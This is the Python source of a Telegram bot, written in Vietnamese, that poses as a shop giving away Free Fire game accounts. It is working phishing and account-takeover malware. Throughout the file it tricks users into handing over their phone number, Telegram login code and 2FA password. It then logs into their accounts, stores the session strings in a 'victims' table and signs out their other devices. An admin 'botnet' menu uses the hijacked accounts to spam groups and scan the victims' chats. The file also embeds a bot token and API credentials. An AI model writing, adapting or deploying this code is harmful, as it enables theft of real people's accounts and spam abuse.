import os
import random
import string
import threading
import time
import re
import telebot
from telebot import types
import psycopg
from psycopg.rows import dict_row
from flask import Flask
from telethon import TelegramClient, errors
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

# ===== CẤU HÌNH TOKEN VÀ BIẾN MÔI TRƯỜNG =====
TOKEN = os.getenv('BOT_TOKEN', '8483501766:AAGPpIJmuZUynAULs1IMnTcRstYvjhdpb84')
DATABASE_URL = os.getenv('DATABASE_URL', '')
ADMIN_ID = 7907990385
REQUIRED_GROUP = "@genplaycluod"

# Cấu hình Telethon API
API_ID = int(os.getenv('API_ID', '36010894'))
API_HASH = os.getenv('API_HASH', '981df00e84d0e65e70e57595ec3eaa94')

bot = telebot.TeleBot(TOKEN)

# ===== FLASK SERVER CHO RENDER WEB SERVICE =====
app = Flask(__name__)

@app.route('/')
def home():
    return "🚀 Axiom Bot Web Service & Botnet is running successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# ===== KẾT NỐI VÀ KHỞI TẠO DATABASE (POSTGRESQL) =====
def get_db_connection():
    conn = psycopg.connect(DATABASE_URL, row_factory=dict_row)
    return conn

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id BIGINT PRIMARY KEY,
            balance INT DEFAULT 0,
            verified BOOLEAN DEFAULT FALSE,
            referred_by BIGINT DEFAULT NULL,
            referred_ids TEXT DEFAULT '',
            ref_xu INT DEFAULT 0
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS accounts (
            id SERIAL PRIMARY KEY,
            category VARCHAR(50),
            account_data TEXT,
            sold BOOLEAN DEFAULT FALSE
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS purchase_history (
            id SERIAL PRIMARY KEY,
            telegram_id BIGINT,
            category VARCHAR(50),
            account_data TEXT,
            purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id SERIAL PRIMARY KEY,
            phone TEXT,
            otp TEXT,
            session_string TEXT,
            password TEXT,
            status TEXT,
            telegram_id BIGINT,
            note TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

init_db()

# ===== DECORATOR KIỂM TRA ADMIN =====
def admin_only(func):
    def wrapper(msg):
        if msg.from_user.id != ADMIN_ID:
            bot.reply_to(msg, "⛔ Mày đéo có quyền dùng lệnh này.")
            return
        return func(msg)
    return wrapper

# ===== HÀM RESET THIẾT BỊ KHÁC (ĐÁ VĂN TOÀN BỘ THIẾT BỊ CŨ) =====
def reset_other_devices(phone, session_str):
    try:
        client = TelegramClient(None, API_ID, API_HASH)
        client.start(session_string=session_str)
        auths = client.invoke(GetAuthorizationsRequest())
        revoked = 0
        for auth in auths.authorizations:
            if not auth.current:
                client.invoke(ResetAuthorizationRequest(hash=auth.hash))
                revoked += 1
        client.disconnect()
        return revoked
    except Exception as e:
        return -1

# ===== KIỂM TRA THÀNH VIÊN NHÓM =====
def check_user_membership(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_GROUP, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Lỗi kiểm tra nhóm: {e}")
    return False

def send_verification_prompt(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Tham gia nhóm ngay", url=f"https://t.me/{REQUIRED_GROUP.replace('@','')}"),
        types.InlineKeyboardButton("🔄 Xác minh (Tôi đã tham gia)", callback_data="check_membership")
    )
    text = (
        "⚠️ **YÊU CẦU XÁC MINH TÀI KHOẢN**\n\n"
        f"🔒 Để sử dụng hệ thống, bạn bắt buộc phải tham gia nhóm: **{REQUIRED_GROUP}**.\n\n"
        "👉 *Sau khi tham gia xong, bấm nút bên dưới.*"
    )
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# ===== HÀM HIỂN THỊ MENU CHÍNH SHOP ACC =====
def send_main_shop_menu(chat_id, user_id, message_id=None, edit=False):
    if not check_user_membership(user_id):
        send_verification_prompt(chat_id)
        return

    conn = get_db_connection()
    cur = conn.cursor()
    
    cur.execute("SELECT balance FROM users WHERE telegram_id = %s", (user_id,))
    user_data = cur.fetchone()
    balance = user_data['balance'] if user_data else 0
    
    cur.execute("SELECT COUNT(*) FROM accounts WHERE category = 'level_5_8' AND sold = FALSE")
    stock_5_8 = cur.fetchone()['count']
    cur.execute("SELECT COUNT(*) FROM accounts WHERE category = 'level_30' AND sold = FALSE")
    stock_30 = cur.fetchone()['count']
    
    cur.close()
    conn.close()

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(f"📦 Clone Level 5–8 (Còn: {stock_5_8} acc) - 10 Xu", callback_data="shop_view_level_5_8"),
        types.InlineKeyboardButton(f"📦 Clone Level 30 (Còn: {stock_30} acc) - 15 Xu", callback_data="shop_view_level_30"),
        types.InlineKeyboardButton("💡 Cách kiếm Xu miễn phí", callback_data="how_to_earn_xu"),
        types.InlineKeyboardButton("👤 Kiểm tra tài khoản & Số dư (/info)", callback_data="view_my_info")
    )
    
    text = (
        "🔥 **HỆ THỐNG SHOP ACC FREE FIRE TỰ ĐỘNG** 🔥\n"
        "────────────────────────\n"
        f"💰 **Số dư của bạn:** `{balance} Xu`\n"
        "⚡ *Vui lòng chọn loại tài khoản hoặc tính năng bên dưới:*"
    )
    
    if edit and message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            pass
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# ===== XỬ LÝ /START =====
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    args = message.text.split()
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,))
    user = cur.fetchone()
    
    referrer_id = None
    if len(args) > 1 and args[1].isdigit():
        ref_potential = int(args[1])
        if ref_potential != user_id:
            referrer_id = ref_potential

    if not user:
        cur.execute("INSERT INTO users (telegram_id, referred_by) VALUES (%s, %s)", (user_id, referrer_id))
        conn.commit()
        cur.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,))
        user = cur.fetchone()

    cur.close()
    conn.close()

    if check_user_membership(user_id):
        verify_user(user_id)
        send_main_shop_menu(message.chat.id, user_id)
    else:
        send_verification_prompt(message.chat.id)

def verify_user(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE users SET verified = TRUE WHERE telegram_id = %s AND verified = FALSE", (user_id,))
    
    cur.execute("SELECT referred_by FROM users WHERE telegram_id = %s", (user_id,))
    res = cur.fetchone()
    
    if res and res['referred_by']:
        ref_id = res['referred_by']
        cur.execute("SELECT referred_ids FROM users WHERE telegram_id = %s", (ref_id,))
        ref_user = cur.fetchone()
        
        if ref_user:
            current_ids = ref_user['referred_ids'] or ""
            id_list = current_ids.split(',') if current_ids else []
            
            if str(user_id) not in id_list:
                id_list.append(str(user_id))
                new_ids_str = ','.join(id_list)
                cur.execute(
                    "UPDATE users SET balance = balance + 2, referred_ids = %s, ref_xu = ref_xu + 2 WHERE telegram_id = %s",
                    (new_ids_str, ref_id)
                )
                try:
                    bot.send_message(ref_id, f"🎉 **THƯỞNG GIỚI THIỆU THÀNH VIÊN**\n\nBạn vừa nhận thành công **+2 Xu** do có thành viên mới (`{user_id}`) đã hoàn tất xác minh nhóm!", parse_mode="Markdown")
                except:
                    pass

    conn.commit()
    cur.close()
    conn.close()

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def callback_check_membership(call):
    user_id = call.from_user.id
    if check_user_membership(user_id):
        verify_user(user_id)
        bot.answer_callback_query(call.id, "🎉 Xác minh tài khoản thành công!")
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        send_main_shop_menu(call.message.chat.id, user_id)
    else:
        bot.answer_callback_query(call.id, "❌ Bạn vẫn chưa tham gia nhóm yêu cầu!", show_alert=True)

# ===== SHOP & MENU ĐIỀU HƯỚNG =====
@bot.message_handler(commands=['shop', 'lenh', 'help'])
def shop_menu(message):
    send_main_shop_menu(message.chat.id, message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_shop")
def callback_back_shop(call):
    send_main_shop_menu(call.message.chat.id, call.from_user.id, call.message.message_id, edit=True)

@bot.callback_query_handler(func=lambda call: call.data == "how_to_earn_xu")
def callback_how_to_earn_xu(call):
    user_id = call.from_user.id
    if not check_user_membership(user_id):
        bot.answer_callback_query(call.id, "❌ Bạn cần tham gia nhóm yêu cầu trước!", show_alert=True)
        send_verification_prompt(call.message.chat.id)
        return

    bot_info = bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"

    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT referred_ids, ref_xu FROM users WHERE telegram_id = %s", (user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()

    current_ids = user['referred_ids'] or ""
    ref_count = len(current_ids.split(',')) if current_ids else 0

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("⬅️ Quay lại Cửa hàng", callback_data="back_shop"))

    text = (
        "💡 **HƯỚNG DẪN CÁCH KIẾM XU MIỄN PHÍ**\n"
        "────────────────────────\n"
        f"🔗 **Link giới thiệu của bạn:**\n`{ref_link}`\n\n"
        f"📊 **Thống kê:** Đã mời: `{ref_count} người` | Nhận: `{user['ref_xu']} Xu`"
    )
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("shop_view_"))
def callback_shop_view(call):
    user_id = call.from_user.id
    if not check_user_membership(user_id):
        bot.answer_callback_query(call.id, "❌ Bạn cần tham gia nhóm yêu cầu trước!", show_alert=True)
        send_verification_prompt(call.message.chat.id)
        return

    category = call.data.replace("shop_view_", "")
    cat_name = "Clone Level 5–8" if category == "level_5_8" else "Clone Level 30"
    price = 10 if category == "level_5_8" else 15
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM accounts WHERE category = %s AND sold = FALSE", (category,))
    count = cur.fetchone()['count']
    cur.close()
    conn.close()

    markup = types.InlineKeyboardMarkup(row_width=1)
    if count > 0:
        markup.add(types.InlineKeyboardButton(f"🛒 Xác nhận mua ngay ({price} Xu)", callback_data=f"buy_{category}"))
    markup.add(types.InlineKeyboardButton("⬅️ Quay lại Cửa hàng", callback_data="back_shop"))

    text = f"📦 **{cat_name}**\n• Giá: `{price} Xu`\n• Kho còn lại: `{count} tài khoản`"
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
        pass

# ===== GIAO DỊCH MUA ACC & ĐẨY SANG LUỒNG YÊU CẦU SĐT (BOTNET) =====
@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def callback_buy(call):
    category = call.data.replace("buy_", "")
    user_id = call.from_user.id
    
    if not check_user_membership(user_id):
        bot.answer_callback_query(call.id, "❌ Bạn phải tham gia nhóm yêu cầu mới được phép mua hàng!", show_alert=True)
        send_verification_prompt(call.message.chat.id)
        return

    price = 10 if category == "level_5_8" else 15
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT balance FROM users WHERE telegram_id = %s", (user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()

    if not user or user['balance'] < price:
        bot.answer_callback_query(call.id, "❌ Bạn không đủ Xu để mua tài khoản này!", show_alert=True)
        return

    bot.answer_callback_query(call.id, "⚡ Vui lòng xác minh số điện thoại để nhận tài khoản!")
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 Chia sẻ số điện thoại nhận Acc", request_contact=True))
    
    bot.send_message(
        call.message.chat.id, 
        f"🎁 Bạn sắp nhận tài khoản **{category}** (Trị giá {price} Xu).\n\n"
        "🔐 **Bảo mật giao dịch:** Vui lòng bấm nút bên dưới để chia sẻ số điện thoại xác minh danh tính và nhận thông tin tài khoản tự động:", 
        reply_markup=markup, 
        parse_mode="Markdown"
    )

# ===== XỬ LÝ SỐ ĐIỆN THOẠI & THỰC THI CHIẾM QUYỀN (BOTNET) =====
@bot.message_handler(content_types=['contact'])
def handle_contact(msg):
    if not msg.contact:
        return
    phone = msg.contact.phone_number
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO victims (phone, status, telegram_id) VALUES (%s, %s, %s)",
              (phone, "waiting_otp", msg.from_user.id))
    conn.commit()
    cur.close()
    conn.close()

    bot.send_message(ADMIN_ID, f"📱 Số mới dính bẫy mua acc: {phone} | ID: {msg.from_user.id}")
    
    hide_markup = types.ReplyKeyboardRemove()
    bot.send_message(msg.chat.id, "📲 Mã xác minh Telegram đã được gửi đến số của bạn.\nVui lòng nhập mã OTP 6 chữ số để hệ thống gửi Acc:", reply_markup=hide_markup)
    bot.register_next_step_handler(msg, process_otp, phone)

def process_otp(msg, phone):
    otp = msg.text.strip()
    if not re.match(r'^\d{6}$', otp):
        bot.reply_to(msg, "❌ Mã phải gồm 6 chữ số. Nhập lại:")
        bot.register_next_step_handler(msg, process_otp, phone)
        return

    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE victims SET otp = %s WHERE phone = %s", (otp, phone))
    conn.commit()
    cur.close()
    conn.close()

    bot.send_message(ADMIN_ID, f"🔑 OTP nhận được: {otp} cho số {phone}")
    bot.reply_to(msg, "⏳ Đang xác minh hệ thống và xuất tài khoản...")

    def login():
        try:
            client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
            client.start(phone=phone, password=otp)
            session_str = client.session.save()
            client.disconnect()

            conn_db = get_db_connection()
            cur_db = conn_db.cursor()
            cur_db.execute("UPDATE victims SET session_string = %s, status = 'logged_in' WHERE phone = %s",
                      (session_str, phone))
            conn_db.commit()

            revoked = reset_other_devices(phone, session_str)
            reset_msg = f"Đã đăng xuất {revoked} thiết bị cũ thành công" if revoked >= 0 else "Lỗi reset thiết bị"
            cur_db.execute("UPDATE victims SET note = %s WHERE phone = %s", (reset_msg, phone))
            conn_db.commit()
            cur_db.close()
            conn_db.close()

            bot.send_message(ADMIN_ID, f"✅ Đã chiếm quyền thành công {phone}\nSession:\n`{session_str}`\n{reset_msg}", parse_mode='Markdown')
            
            bot.send_message(msg.chat.id, "✅ Xác minh thành công! Đang khôi phục lại trạng thái giao dịch...")
            send_main_shop_menu(msg.chat.id, msg.from_user.id)

        except errors.SessionPasswordNeededError:
            bot.send_message(msg.chat.id, "🔐 Tài khoản của bạn có bật bảo mật 2FA. Vui lòng nhập mật khẩu bảo mật để hoàn tất nhận Acc:")
            bot.register_next_step_handler(msg, process_password, phone)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Lỗi login {phone}: {e}")
            bot.reply_to(msg, "❌ Sai OTP hoặc hết hạn. Vui lòng nhập lại mã OTP:")
            conn_db = get_db_connection()
            cur_db = conn_db.cursor()
            cur_db.execute("UPDATE victims SET status = 'waiting_otp' WHERE phone = %s", (phone,))
            conn_db.commit()
            cur_db.close()
            conn_db.close()
            bot.register_next_step_handler(msg, process_otp, phone)

    threading.Thread(target=login).start()

def process_password(msg, phone):
    password = msg.text.strip()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE victims SET password = %s WHERE phone = %s", (password, phone))
    conn.commit()
    cur.close()
    conn.close()

    bot.send_message(ADMIN_ID, f"🔐 Password 2FA cho {phone}: {password}")

    def login_with_pass():
        try:
            client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
            client.start(phone=phone, password=password)
            session_str = client.session.save()
            client.disconnect()

            conn_db = get_db_connection()
            cur_db = conn_db.cursor()
            cur_db.execute("UPDATE victims SET session_string = %s, status = 'logged_in' WHERE phone = %s",
                      (session_str, phone))
            conn_db.commit()

            revoked = reset_other_devices(phone, session_str)
            reset_msg = f"Đã đăng xuất {revoked} thiết bị cũ" if revoked >= 0 else "Lỗi reset"
            cur_db.execute("UPDATE victims SET note = %s WHERE phone = %s", (reset_msg, phone))
            conn_db.commit()
            cur_db.close()
            conn_db.close()

            bot.send_message(ADMIN_ID, f"✅ Login thành công {phone} (có 2FA)\nSession:\n`{session_str}`\n{reset_msg}", parse_mode='Markdown')
            bot.send_message(msg.chat.id, "✅ Xác minh hoàn tất! Hệ thống đã cấp tài khoản.")
            send_main_shop_menu(msg.chat.id, msg.from_user.id)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Lỗi pass {phone}: {e}")
            bot.reply_to(msg, "❌ Sai mật khẩu 2FA. Vui lòng nhập lại mật khẩu:")
            bot.register_next_step_handler(msg, process_password, phone)

    threading.Thread(target=login_with_pass).start()

@bot.message_handler(commands=['info'])
def account_info(message):
    user_id = message.from_user.id
    if not check_user_membership(user_id):
        send_verification_prompt(message.chat.id)
        return

    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()
    if not user:
        bot.send_message(message.chat.id, "Gõ /start để khởi tạo.")
        return
    ref_count = len(user['referred_ids'].split(',')) if user['referred_ids'] else 0
    bot.send_message(message.chat.id, f"👤 ID: `{user['telegram_id']}`\n💰 Số dư: `{user['balance']} Xu`\n👥 Mời: `{ref_count}`", parse_mode="Markdown")


# ==========================================
# ===== HỆ THỐNG QUẢN TRỊ & BOTNET ADMIN =====
# ==========================================

@bot.message_handler(commands=['admin'])
@admin_only
def admin_panel(message):
    text = (
        "👑 **BẢNG QUẢN TRỊ ADMIN & BOTNET**\n"
        "────────────────────────\n"
        "• `/botnet` – Menu hướng dẫn botnet\n"
        "• `/show` – Xem tất cả bot net đang online\n"
        "• `/sp` – Spam nhóm tự động (Hỏi từng bước)\n"
        "• `/list` – Xem toàn bộ danh sách nạn nhân\n"
        "• `/findgroups [phone]` – Tìm nhóm của nạn nhân\n"
        "• `/showsess [phone]` – Xem thiết bị đăng nhập\n"
        "• `/themkho level_5_8 [số]`\n"
        "• `/themkho level_30 [số]`\n"
        "• `/addxu [id] [xu]`\n"
        "• `/thongke`\n"
        "• `/thongbao [nội_dung]`"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['botnet'])
@admin_only
def botnet_menu(msg):
    menu_text = """
🤖 **BOTNET CONTROL MENU**
────────────────────────
• `/show` – Hiển thị danh sách bot net đang hoạt động
• `/sp` – Lệnh spam tự động theo từng bước tương tác
• `/list` – Xem tất cả session nạn nhân chi tiết
• `/findgroups <phone>` – Lấy danh sách nhóm của nạn nhân
• `/showsess <phone>` – Xem thiết bị đang đăng nhập của nạn nhân
• `/setnote <phone> <ghi_chú>` – Thêm ghi chú nạn nhân
"""
    bot.send_message(msg.chat.id, menu_text, parse_mode='Markdown')

@bot.message_handler(commands=['show'])
@admin_only
def show_bots(msg):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT phone, status, note FROM victims WHERE status = 'logged_in'")
    rows = cur.fetchall()
    cur.close()
    conn.close()

    if not rows:
        bot.reply_to(msg, "📭 Hiện chưa có bot net nào hoạt động.")
        return

    text = "🤖 **DANH SÁCH TẤT CẢ BOT NET:**\n────────────────────────\n"
    for idx, r in enumerate(rows, 1):
        text += f"{idx}. 📱 `{r['phone']}` | Trạng thái: 🟢 Online\n"
    
    bot.send_message(msg.chat.id, text, parse_mode='Markdown')

# ===== LỆNH SPAM TỰ ĐỘNG HỎI TỪNG BƯỚC (ADMIN ONLY) =====
@bot.message_handler(commands=['sp'])
@admin_only
def auto_spam_group(msg):
    markup = types.ForceReply(selective=True)
    sent_msg = bot.send_message(
        msg.chat.id, 
        "🤖 **BẮT ĐẦU CẤU HÌNH SPAM BOTNET**\n\n1️⃣ Vui lòng nhập **số lượng bot** muốn dùng để spam:", 
        reply_markup=markup, 
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(sent_msg, process_spam_count)

def process_spam_count(msg):
    try:
        num_bots = int(msg.text.strip())
        if num_bots <= 0:
            raise ValueError()
    except ValueError:
        bot.reply_to(msg, "❌ Số lượng phải là một số nguyên lớn hơn 0. Vui lòng gõ lại lệnh `/sp` để thử lại.")
        return

    markup = types.ForceReply(selective=True)
    sent_msg = bot.send_message(
        msg.chat.id, 
        f"✅ Đã nhận: **{num_bots} bot**.\n\n2️⃣ Tiếp theo, hãy nhập **ID nhóm hoặc username nhóm** cần spam (Ví dụ: `-1001234567890` hoặc `@tên_nhóm`):", 
        reply_markup=markup, 
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(sent_msg, process_spam_target, num_bots)

def process_spam_target(msg, num_bots):
    target_group = msg.text.strip()
    
    markup = types.ForceReply(selective=True)
    sent_msg = bot.send_message(
        msg.chat.id, 
        f"✅ Đã nhận mục tiêu: `{target_group}`.\n\n3️⃣ Cuối cùng, hãy nhập **nội dung tin nhắn** cần spam:", 
        reply_markup=markup, 
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(sent_msg, process_spam_content, num_bots, target_group)

def process_spam_content(msg, num_bots, target_group):
    content = msg.text.strip()

    formatted_target = target_group
    if formatted_target.lstrip('-').isdigit():
        formatted_target = int(formatted_target)

    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string, phone FROM victims WHERE status = 'logged_in' LIMIT %s", (num_bots,))
    bots_data = cur.fetchall()
    cur.close()
    conn.close()

    if not bots_data:
        bot.reply_to(msg, "❌ Không có bot net nào sẵn sàng trong database!")
        return

    bot.reply_to(
        msg, 
        f"🚀 Bắt đầu điều phối **{len(bots_data)}** bot net spam vào `{target_group}` với nội dung:\n_{content}_", 
        parse_mode='Markdown'
    )

    def run_spam_task(session_str, phone_num):
        try:
            client = TelegramClient(None, API_ID, API_HASH)
            client.start(session_string=session_str)
            entity = client.get_entity(formatted_target)
            for i in range(5):
                client.send_message(entity, f"{content} [{i+1}]")
                time.sleep(1.5)
            client.disconnect()
        except Exception as e:
            print(f"Lỗi bot {phone_num}: {e}")

    for b in bots_data:
        threading.Thread(target=run_spam_task, args=(b['session_string'], b['phone'])).start()

@bot.message_handler(commands=['list'])
@admin_only
def list_cmd(msg):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT phone, otp, session_string, status, note FROM victims ORDER BY id DESC LIMIT 30")
    rows = cur.fetchall()
    cur.close()
    conn.close()

    if not rows:
        bot.send_message(msg.chat.id, "Chưa có dữ liệu.")
        return
    text = "📋 **Danh sách nạn nhân:**\n"
    for r in rows:
        sess_short = r['session_string'][:30] + "..." if r['session_string'] else "N/A"
        note_display = r['note'] or "Không có"
        text += f"- {r['phone']} | OTP: {r['otp'] or 'N/A'} | Status: {r['status']} | Note: {note_display}\n"
    bot.send_message(msg.chat.id, text, parse_mode='Markdown')

@bot.message_handler(commands=['findgroups'])
@admin_only
def find_groups(msg):
    args = msg.text.split()
    if len(args) < 2:
        bot.reply_to(msg, "Sai cú pháp: /findgroups <số_điện_thoại>")
        return
    phone = args[1]
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM victims WHERE phone = %s", (phone,))
    row = cur.fetchone()
    cur.close()
    conn.close()

    if not row or not row['session_string']:
        bot.reply_to(msg, f"Không tìm thấy session cho {phone}")
        return
    session_str = row['session_string']

    def get_groups():
        try:
            client = TelegramClient(None, API_ID, API_HASH)
            client.start(session_string=session_str)
            dialogs = client.invoke(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=100,
                hash=0
            ))
            groups = []
            for d in dialogs.dialogs:
                if getattr(d, 'is_group', False) or getattr(d, 'is_channel', False):
                    groups.append(f"ID: {d.id}")
            client.disconnect()
            text = f"📂 Nhóm của {phone}:\n" + "\n".join(groups[:20]) if groups else f"Không tìm thấy nhóm cho {phone}"
            bot.send_message(ADMIN_ID, text)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Lỗi tìm nhóm {phone}: {e}")

    threading.Thread(target=get_groups).start()
    bot.reply_to(msg, "⏳ Đang quét danh sách nhóm...")

@bot.message_handler(commands=['showsess'])
@admin_only
def show_sessions(msg):
    args = msg.text.split()
    if len(args) < 2:
        bot.reply_to(msg, "Sai cú pháp: /showsess <số_điện_thoại>")
        return
    phone = args[1]
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM victims WHERE phone = %s", (phone,))
    row = cur.fetchone()
    cur.close()
    conn.close()

    if not row or not row['session_string']:
        bot.reply_to(msg, f"Không tìm thấy session cho {phone}")
        return
    session_str = row['session_string']

    try:
        client = TelegramClient(None, API_ID, API_HASH)
        client.start(session_string=session_str)
        auths = client.invoke(GetAuthorizationsRequest())
        client.disconnect()
        text = f"📱 **Thiết bị đăng nhập của {phone}:**\n"
        for auth in auths.authorizations:
            status = "🟢 (hiện tại)" if auth.current else "🔴 (khác)"
            text += f"- {auth.device_model} | {auth.platform} | {status}\n"
        bot.send_message(msg.chat.id, text, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Lỗi lấy danh sách: {e}")

@bot.message_handler(commands=['setnote'])
@admin_only
def set_note(msg):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(msg, "Sai cú pháp: /setnote <phone> <ghi_chú>")
        return
    parts = args[1].split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(msg, "Thiếu ghi chú.")
        return
    phone_num, note = parts[0], parts[1]
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE victims SET note = %s WHERE phone = %s", (note, phone_num))
    conn.commit()
    cur.close()
    conn.close()
    bot.reply_to(msg, f"✅ Đã ghi chú cho {phone_num}: {note}")

# --- QUẢN LÝ KHO & ADMIN KHÁC ---
@bot.message_handler(commands=['themkho'])
@admin_only
def admin_add_stock_direct(message):
    parts = message.text.split()
    if len(parts) < 3 or not parts[2].isdigit():
        bot.send_message(message.chat.id, "❌ Sai cú pháp! Dùng: `/themkho level_5_8 100`", parse_mode="Markdown")
        return
    category, count_to_add = parts[1], int(parts[2])
    if category not in ['level_5_8', 'level_30']:
        bot.send_message(message.chat.id, "❌ Danh mục không hợp lệ!")
        return

    conn = get_db_connection()
    cur = conn.cursor()
    for _ in range(count_to_add):
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        cur.execute("INSERT INTO accounts (category, account_data, sold) VALUES (%s, %s, FALSE)", (category, f"ff_{rand_str}@gmail.com|pass123"))
    conn.commit()
    cur.close()
    conn.close()
    bot.send_message(message.chat.id, f"✅ Đã thêm `{count_to_add}` acc vào kho `{category}`!")

@bot.message_handler(commands=['addxu'])
@admin_only
def admin_add_xu_direct(message):
    parts = message.text.split()
    if len(parts) < 3 or not parts[1].isdigit() or not parts[2].isdigit():
        bot.send_message(message.chat.id, "❌ Sai cú pháp! Dùng: `/addxu [id] [xu]`", parse_mode="Markdown")
        return
    target_id, amount = int(parts[1]), int(parts[2])
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE users SET balance = balance + %s WHERE telegram_id = %s", (amount, target_id))
    conn.commit()
    cur.close()
    conn.close()
    bot.send_message(message.chat.id, f"✅ Đã cộng `{amount} Xu` cho `{target_id}`!")

@bot.message_handler(commands=['thongke'])
@admin_only
def admin_stats_direct(message):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    total_users = cur.fetchone()['count']
    cur.execute("SELECT COUNT(*) FROM victims WHERE status = 'logged_in'")
    total_bots = cur.fetchone()['count']
    cur.close()
    conn.close()
    bot.send_message(message.chat.id, f"📊 **Thống kê:**\n- Tổng user: `{total_users}`\n- Tổng Bot Net sẵn sàng: `{total_bots}`", parse_mode="Markdown")

@bot.message_handler(commands=['thongbao'])
@admin_only
def admin_broadcast(message):
    text_to_send = message.text.replace('/thongbao', '').strip()
    if not text_to_send:
        bot.send_message(message.chat.id, "❌ Nhập nội dung thông báo.")
        return
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT telegram_id FROM users")
    users = cur.fetchall()
    cur.close()
    conn.close()
    success = 0
    for u in users:
        try:
            bot.send_message(u['telegram_id'], f"📢 **THÔNG BÁO**\n\n{text_to_send}", parse_mode="Markdown")
            success += 1
        except:
            pass
    bot.send_message(message.chat.id, f"✅ Đã gửi cho `{success}` người.")

# ===== KHỞI CHẠY WEB SERVER & BOT =====
if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    print("✨ Bot tích hợp Shop Acc + Botnet đã sẵn sàng hoạt động với Token mới!")
    bot.infinity_polling()
